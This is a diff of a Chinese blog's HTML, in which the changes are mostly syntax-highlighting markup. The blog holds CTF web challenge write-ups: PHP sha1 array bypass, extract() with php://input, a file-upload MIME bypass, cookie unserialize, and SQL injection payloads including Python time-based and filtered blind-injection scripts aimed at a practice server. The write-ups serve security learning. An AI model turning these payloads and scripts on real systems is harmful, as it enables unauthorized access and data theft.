     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>] == <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])
 
         <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;passwd can not be uname.&#x27;</span>;
 
-    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) === sha1(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])&amp;(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>))
+    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])&amp;(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>))
 
         <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
 
@@ -465,7 +465,7 @@ highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);
 <p>get:id uname</p>
 <p>post:passwd</p>
 <p>id需要进行一次urldecode，解码的值为margin</p>
-<p>uname与passwd不相同，但是sha1值要相同，并且是严格相等 ===，这里可以使用sha1函数的漏洞，无法处理数组类型的变量，最后会返回0，也可以用sha1强碰撞。</p>
+<p>uname与passwd不相同，但是sha1值要相同，并且是严格相等 &#x3D;&#x3D;&#x3D;，这里可以使用sha1函数的漏洞，无法处理数组类型的变量，最后会返回0，也可以用sha1强碰撞。</p>
 <p>payload</p>
 <div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">urlencode</span>(margin)=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E
 <span class="hljs-attribute">uname</span>[]=<span class="hljs-number">1</span>
@@ -474,12 +474,12 @@ highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);
 <span class="hljs-attribute">GET</span>: id=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E&amp;uname[]=<span class="hljs-number">1</span>
 <span class="hljs-attribute">POST</span>:passwd[]=<span class="hljs-number">2</span></code></pre></div>
 
-<p><img src="https://i.loli.net/2020/11/23/MPLxeWwG2BIYHbf.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/23/MPLxeWwG2BIYHbf.png" srcset="/img/loading.gif"></p>
 <h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-extract(<span class="hljs-variable">$_GET</span>);
+<span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);
 <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$ac</span>))
 &#123;
-<span class="hljs-variable">$f</span> = trim(file_get_contents(<span class="hljs-variable">$fn</span>));
+<span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$fn</span>));
 <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ac</span> === <span class="hljs-variable">$f</span>)
 &#123;
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="hljs-string">&quot; <span class="hljs-subst">$flag</span>&lt;/p&gt;&quot;</span>;
@@ -495,14 +495,14 @@ extract(<span class="hljs-variable">$_GET</span>);
 <p>(PHP 4, PHP 5, PHP 7)</p>
 <p>extract — 从数组中将变量导入到当前的符号表</p>
 <p>说明</p>
-<p>extract ( array <code>&amp;$array</code> [, int <code>$flags</code> = EXTR_OVERWRITE [, string <code>$prefix</code> = <strong><code>NULL</code></strong> ]] ) : int</p>
+<p>extract ( array <code>&amp;$array</code> [, int <code>$flags</code> &#x3D; EXTR_OVERWRITE [, string <code>$prefix</code> &#x3D; <strong><code>NULL</code></strong> ]] ) : int</p>
 <p>本函数用来将变量从数组中导入到当前的符号表中。</p>
 <p>检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</p>
 <p><strong>trim</strong></p>
 <p>(PHP 4, PHP 5, PHP 7)</p>
 <p>trim — 去除字符串首尾处的空白字符（或者其他字符）</p>
 <p>说明</p>
-<p>trim ( string <code>$str</code> [, string <code>$character_mask</code> = “ \t\n\r\0\x0B” ] ) : string</p>
+<p>trim ( string <code>$str</code> [, string <code>$character_mask</code> &#x3D; “ \t\n\r\0\x0B” ] ) : string</p>
 <p>此函数返回字符串 <code>str</code> 去除首尾空白字符后的结果。如果不指定第二个参数，<strong>trim()</strong> 将去除这些字符：</p>
 <ul>
 <li>“ “ (ASCII <code>32</code> (<code>0x20</code>))，普通空格符。</li>
@@ -513,13 +513,13 @@ extract(<span class="hljs-variable">$_GET</span>);
 <li>“\x0B” (ASCII <code>11</code> (<code>0x0B</code>))，垂直制表符。</li>
 </ul>
 <p><strong>file_get_contents</strong></p>
-<p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7)</p>
+<p>(PHP 4 &gt;&#x3D; 4.3.0, PHP 5, PHP 7)</p>
 <p>file_get_contents — 将整个文件读入一个字符串</p>
 <p>代码的大致含义就是</p>
-<p>get方式提交参数，用extract函数将变量写入符号表中，如果get提交的参数中包含$ac，则利用file_get_content函数从文件中读取内容并赋值给$f,如果$ac===$f则拿到flag</p>
-<p>这里需要利用php的伪协议写入内容 php://input</p>
+<p>get方式提交参数，用extract函数将变量写入符号表中，如果get提交的参数中包含$ac，则利用file_get_content函数从文件中读取内容并赋值给$f,如果$ac&#x3D;&#x3D;&#x3D;$f则拿到flag</p>
+<p>这里需要利用php的伪协议写入内容 php:&#x2F;&#x2F;input</p>
 <p>payload</p>
-<div class="hljs"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span> ac=<span class="hljs-number">111</span><span class="hljs-variable">&amp;fn</span>=php:<span class="hljs-comment">//input</span>
+<div class="hljs"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span> <span class="hljs-attr">ac</span><span class="hljs-operator">=</span><span class="hljs-number">111</span><span class="hljs-variable">&amp;fn</span>=php:<span class="hljs-comment">//input</span>
 <span class="hljs-symbol">POST:</span> <span class="hljs-number">111</span></code></pre></div>
 
 
@@ -527,10 +527,10 @@ extract(<span class="hljs-variable">$_GET</span>);
 <h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>题目网站崩了</p>
 <h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>文件上传</p>
 <p>首先先上传一个图片文件，上传成功了并返回保存路径</p>
-<p>再上传一个php的文件，提示<code>Invalid file</code></p>
+<p>再上传一个php的文件，提示<code>Invalid file </code></p>
 <p>上传.htaccess, .user.ini都提示<code>you got it</code></p>
 <p>两种提示不一样猜测可能存在后缀黑名单和文件类型检测。</p>
-<p>上传一个php5文件并bp抓包修改MIME(Content-Type)为 image/.jpeg还是提示invalid file </p>
+<p>上传一个php5文件并bp抓包修改MIME(Content-Type)为 image&#x2F;.jpeg还是提示invalid file </p>
 <p><img src="https://i.loli.net/2020/11/23/FgbfWmJIoNxpw7V.png" srcset="/img/loading.gif" alt="getshell1.png"></p>
 <p>再修改请求头部的Content-Type，利用大小写绕过，成功拿到flag</p>
 <p><img src="https://i.loli.net/2020/11/23/w2bYAuHngShyXCI.png" srcset="/img/loading.gif" alt="getshell2.png"></p>
@@ -542,7 +542,7 @@ extract(<span class="hljs-variable">$_GET</span>);
 <h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p>提示了insert into注入</p>
 <p>并给出了源码</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
 
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIp</span>(<span class="hljs-params"></span>)</span>&#123;
 <span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;&#x27;</span>;
@@ -551,7 +551,7 @@ error_reporting(<span class="hljs-number">0</span>);
 &#125;<span class="hljs-keyword">else</span>&#123;
 <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];				<span class="hljs-comment">//remote_addr	</span>
 &#125;
-<span class="hljs-variable">$ip_arr</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$ip</span>);				<span class="hljs-comment">//过滤 ,</span>
+<span class="hljs-variable">$ip_arr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$ip</span>);				<span class="hljs-comment">//过滤 ,</span>
 <span class="hljs-keyword">return</span> <span class="hljs-variable">$ip_arr</span>[<span class="hljs-number">0</span>];
 
 &#125;
@@ -561,14 +561,14 @@ error_reporting(<span class="hljs-number">0</span>);
 <span class="hljs-variable">$pass</span>=<span class="hljs-string">&quot;&quot;</span>;
 <span class="hljs-variable">$db</span>=<span class="hljs-string">&quot;&quot;</span>;
 
-<span class="hljs-variable">$connect</span> = mysql_connect(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to connect&quot;</span>);<span class="hljs-comment">//连接数据库</span>
+<span class="hljs-variable">$connect</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to connect&quot;</span>);<span class="hljs-comment">//连接数据库</span>
 
-mysql_select_db(<span class="hljs-variable">$db</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to select database&quot;</span>);
+<span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-variable">$db</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to select database&quot;</span>);
 
-<span class="hljs-variable">$ip</span> = getIp();
+<span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;your ip is :&#x27;</span>.<span class="hljs-variable">$ip</span>;
 <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into client_ip (ip) values (&#x27;<span class="hljs-subst">$ip</span>&#x27;)&quot;</span>; <span class="hljs-comment">//注入点</span>
-mysql_query(<span class="hljs-variable">$sql</span>);
+<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>网页显示出自己的ip地址，想到的是xff头，修改了xff头的内容后，页面回显也会改变，所以就是xff注入。</p>
@@ -610,7 +610,7 @@ sql = <span class="hljs-string">&quot;127.0.0.1&#x27;+(select case when substr((
 url = <span class="hljs-string">&#x27;http://123.206.87.240:8002/web15/&#x27;</span>
 flag = <span class="hljs-string">&#x27;&#x27;</span>
 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
-    print(<span class="hljs-built_in">str</span>(i))
+    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(i))
     <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">129</span>):
         <span class="hljs-keyword">if</span> ch == <span class="hljs-number">128</span>:
             sys.exit(<span class="hljs-number">0</span>)
@@ -622,7 +622,7 @@ flag = <span class="hljs-string">&#x27;&#x27;</span>
             html = requests.get(url, headers=header, timeout=<span class="hljs-number">3</span>) <span class="hljs-comment">#响应时间超过3秒则 进入except 即可猜测是正确的</span>
         <span class="hljs-keyword">except</span>:
             flag += <span class="hljs-built_in">chr</span>(ch)
-            print(flag)
+            <span class="hljs-built_in">print</span>(flag)
             <span class="hljs-keyword">break</span></code></pre></div>
 
 
@@ -634,8 +634,8 @@ flag = <span class="hljs-string">&#x27;&#x27;</span>
 </blockquote>
 <p>看到题目提示，应该是二次注入</p>
 <p>url中存在id参数，再id参数后加 ‘后页面报错，再加上#后显示 <code>There is nothing</code></p>
-<p>输入 id=1’or 1=1–+ 报错</p>
-<p>但是输入id=1’oorr 1=1–+ 时正常了，说明存在关键词过滤，通过异或注入发现过滤了union,select,and,or等关键词，可以用双写绕过。</p>
+<p>输入 id&#x3D;1’or 1&#x3D;1–+ 报错</p>
+<p>但是输入id&#x3D;1’oorr 1&#x3D;1–+ 时正常了，说明存在关键词过滤，通过异或注入发现过滤了union,select,and,or等关键词，可以用双写绕过。</p>
 <div class="hljs"><pre><code class="hljs matlab"><span class="hljs-number">1</span>&#x27;^(<span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;union&#x27;</span>)!=<span class="hljs-number">0</span>)--+
 页面显示错误正常说明<span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;union&#x27;</span>)!=<span class="hljs-number">0</span>是错的，即<span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;union&#x27;</span>)=<span class="hljs-number">0</span>，说明union替换为空了
 其他关键词的测试也类似</code></pre></div>
@@ -676,15 +676,15 @@ flag = <span class="hljs-string">&#x27;&#x27;</span>
 <p><img src="https://i.loli.net/2020/11/23/QwtPgsAriuMOGLB.png" srcset="/img/loading.gif" alt="sqls-flag.png"></p>
 <h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>题目给了源码分析可知是一个加密过程，并且给了加密后的字符串，所以写出解密脚本即可</p>
 <p>加密后的数据为</p>
-<div class="hljs"><pre><code class="hljs abnf"><span class="hljs-attribute">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA</span>=</code></pre></div>
+<div class="hljs"><pre><code class="hljs abnf"><span class="hljs-attribute">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA</span><span class="hljs-operator">=</span></code></pre></div>
 
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span></span>)</span>
 <span class="hljs-function"></span>&#123;
-    <span class="hljs-variable">$key</span> = md5(<span class="hljs-string">&#x27;ISCC&#x27;</span>);
+    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;ISCC&#x27;</span>);
     <span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;
-    <span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$data</span>);
-    <span class="hljs-variable">$klen</span> = strlen(<span class="hljs-variable">$key</span>);
+    <span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>);
+    <span class="hljs-variable">$klen</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$key</span>);
     <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span>++) &#123; 
         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$x</span> == <span class="hljs-variable">$klen</span>)
         &#123;
@@ -694,9 +694,9 @@ flag = <span class="hljs-string">&#x27;&#x27;</span>
         <span class="hljs-variable">$x</span>+=<span class="hljs-number">1</span>;
     &#125;
     <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span>++) &#123;
-        <span class="hljs-variable">$str</span> .= chr((ord(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]) + ord(<span class="hljs-variable">$char</span>[<span class="hljs-variable">$i</span>])) % <span class="hljs-number">128</span>);
+        <span class="hljs-variable">$str</span> .= <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$char</span>[<span class="hljs-variable">$i</span>])) % <span class="hljs-number">128</span>);
     &#125;
-    <span class="hljs-keyword">return</span> base64_encode(<span class="hljs-variable">$str</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$str</span>);
 &#125;
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
@@ -706,11 +706,11 @@ flag = <span class="hljs-string">&#x27;&#x27;</span>
 <span class="hljs-meta">&lt;?php</span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>
 <span class="hljs-function"></span>&#123;
-    <span class="hljs-variable">$key</span> = md5(<span class="hljs-string">&#x27;ISCC&#x27;</span>);  <span class="hljs-comment">// 对密钥进行md5加密</span>
+    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;ISCC&#x27;</span>);  <span class="hljs-comment">// 对密钥进行md5加密</span>
     <span class="hljs-variable">$x</span>=<span class="hljs-number">0</span>;
-    <span class="hljs-variable">$str</span>=base64_decode(<span class="hljs-variable">$str</span>); <span class="hljs-comment">//对加密后的字符串base64解码</span>
-    <span class="hljs-variable">$len</span>=strlen(<span class="hljs-variable">$str</span>);     
-    <span class="hljs-variable">$klen</span>=strlen(<span class="hljs-variable">$key</span>);
+    <span class="hljs-variable">$str</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>); <span class="hljs-comment">//对加密后的字符串base64解码</span>
+    <span class="hljs-variable">$len</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>);     
+    <span class="hljs-variable">$klen</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$key</span>);
 
     <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$i</span>++)   <span class="hljs-comment">//计算出char字符数组，用于最后的减操作</span>
     &#123;
@@ -723,11 +723,11 @@ flag = <span class="hljs-string">&#x27;&#x27;</span>
     &#125;
     <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$i</span>++)
     &#123;
-        <span class="hljs-variable">$data</span>.=chr((ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>])-ord(<span class="hljs-variable">$char</span>[<span class="hljs-variable">$i</span>])+<span class="hljs-number">128</span>)%<span class="hljs-number">128</span>);  <span class="hljs-comment">//加上128为了防止出现负数。</span>
+        <span class="hljs-variable">$data</span>.=<span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>])-<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$char</span>[<span class="hljs-variable">$i</span>])+<span class="hljs-number">128</span>)%<span class="hljs-number">128</span>);  <span class="hljs-comment">//加上128为了防止出现负数。</span>
     &#125;
     <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;
 &#125;
-<span class="hljs-keyword">echo</span>(decode(<span class="hljs-string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span>));
+<span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">decode</span>(<span class="hljs-string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span>));
 <span class="hljs-meta">?&gt;</span>
 </code></pre></div>
 
@@ -737,11 +737,11 @@ flag = <span class="hljs-string">&#x27;&#x27;</span>
 <div class="hljs"><pre><code class="hljs php+HTML">&lt;?php
 error_reporting(0);
 include_once(&quot;flag.php&quot;);
-$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];  &#x2F;&#x2F;含cookie 可能需要抓包修改cookie
-if(isset($_GET[&#39;hint&#39;]))&#123;
+$cookie = $_COOKIE[&#x27;ISecer&#x27;];  //含cookie 可能需要抓包修改cookie
+if(isset($_GET[&#x27;hint&#x27;]))&#123;
     show_source(__FILE__);
 &#125;
-elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;) &#x2F;&#x2F;如果反序列化后的$cookie&#x3D;&#x3D;&#x3D;$KEY 拿到flag
+elseif (unserialize($cookie) === &quot;$KEY&quot;) //如果反序列化后的$cookie===$KEY 拿到flag
 &#123;                                           
     echo &quot;$flag&quot;;
 &#125;
@@ -749,25 +749,25 @@ else &#123;
 ?&gt;
 &lt;html&gt;
 &lt;head&gt;
-&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;
-&lt;title&gt;Login&lt;&#x2F;title&gt;
-&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;
-&lt;&#x2F;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+&lt;title&gt;Login&lt;/title&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;
+&lt;/head&gt;
 &lt;body&gt;
 &lt;br&gt;
-&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;
-  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;
-    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;
-    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;
-    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;
-  &lt;&#x2F;form&gt;
-&lt;&#x2F;div&gt;
-&lt;&#x2F;body&gt;
-&lt;&#x2F;html&gt;
+&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;
+  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;
+    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;
+    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt;
+    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt;
+  &lt;/form&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
 
 &lt;?php
 &#125;
-$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;
+$KEY=&#x27;ISecer:www.isecer.com&#x27;;
 ?&gt;</code></pre></div>
 
 <p>代码审计完后思路很简单就是cookie注入，而且$KEY的值下面也已经给了</p>
@@ -781,7 +781,7 @@ $KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;
 <p>请求头</p>
 <div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flagphp/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
 <span class="hljs-attribute">Host</span>: <span class="hljs-number">123.206.87.240:8002</span>
-<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; WOW<span class="hljs-number">64</span>; rv:<span class="hljs-number">46</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">46</span>.<span class="hljs-number">0</span>
+<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; WOW64; rv:<span class="hljs-number">46</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">46</span>.<span class="hljs-number">0</span>
 <span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>
 <span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>
 <span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span>
@@ -793,22 +793,22 @@ $KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;
 <h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>提示：</p>
 <blockquote>
 <p>全都tm过滤了绝望吗？</p>
-<p>提示 !,!=,=,+,-,^,%</p>
+<p>提示 !,!&#x3D;,&#x3D;,+,-,^,%</p>
 </blockquote>
 <p>带有过滤的sql注入</p>
 <p>先测试一下过滤哪些字符</p>
 <p><img src="https://i.loli.net/2020/11/25/zAG3jeME7Ocs2Wt.png" srcset="/img/loading.gif" alt="sql2-2.png"></p>
 <p>测试发现  or ，and,#,–+,union,from ,database(),这些常用字符都被过滤了，没有过滤的字符只有提示中的字符</p>
-<p>测试还可以发现，当uname=admin&amp;passwd=111时提示的password error ,</p>
-<p>但是当uname=adm&amp;passwd=111时提示username error，这也是盲注的一种了。</p>
-<p>当uname=admin’-1-‘&amp;passwd=11时为false</p>
-<p>当uname=admin’-0-‘&amp;passwd=1时为true</p>
+<p>测试还可以发现，当uname&#x3D;admin&amp;passwd&#x3D;111时提示的password error ,</p>
+<p>但是当uname&#x3D;adm&amp;passwd&#x3D;111时提示username error，这也是盲注的一种了。</p>
+<p>当uname&#x3D;admin’-1-‘&amp;passwd&#x3D;11时为false</p>
+<p>当uname&#x3D;admin’-0-‘&amp;passwd&#x3D;1时为true</p>
 <p>所以猜测sql查询语句为</p>
-<div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; select * from users where username&#x3D;$username;</code></pre></div>
+<div class="hljs"><pre><code class="hljs mysql">$sql = select * from users where username=$username;</code></pre></div>
 
 <h3 id="尝试构造注入语句"><a href="#尝试构造注入语句" class="headerlink" title="尝试构造注入语句"></a>尝试构造注入语句</h3><div class="hljs"><pre><code class="hljs lisp">ascii(<span class="hljs-name">substr</span>((<span class="hljs-name">select</span> database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;50</code></pre></div>
 
-<p>上名的语句可以放到admin’-1’&amp;passwd=11中 1的位置</p>
+<p>上名的语句可以放到admin’-1’&amp;passwd&#x3D;11中 1的位置</p>
 <p>但是还是存在很多问题，因为题目过滤了空格，逗号，多次修改后勾出下面的语句</p>
 <div class="hljs"><pre><code class="hljs mysql">ascii(mid(REVERSE(MID((passwd)from(-1)))from(-1)))&gt;0</code></pre></div>
 
@@ -835,11 +835,11 @@ password = <span class="hljs-string">&quot;&quot;</span>
             password +=j
             <span class="hljs-comment">#print(password)</span>
             <span class="hljs-keyword">break</span>
-print(password)</code></pre></div>
+<span class="hljs-built_in">print</span>(password)</code></pre></div>
 
 <p><img src="https://i.loli.net/2020/11/25/uhOXQkE5VNt623H.png" srcset="/img/loading.gif" alt="sql2-5.png"></p>
-<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">005b81fd960f61505237dbb7a3202910</span>
-<span class="hljs-attribute">md5</span>在线解码后为admin<span class="hljs-number">123</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs dns"><span class="hljs-number">005</span>b81fd960f61505237dbb<span class="hljs-number">7a3202910</span>
+md5在线解码后为admin123</code></pre></div>
 
 <p>登录后即可用ls命令，就可以拿到flag</p>
 <p>这题使用的是弱密码，也可以直接使用bp的爆破模块进行密码爆破</p>
@@ -864,33 +864,33 @@ print(password)</code></pre></div>
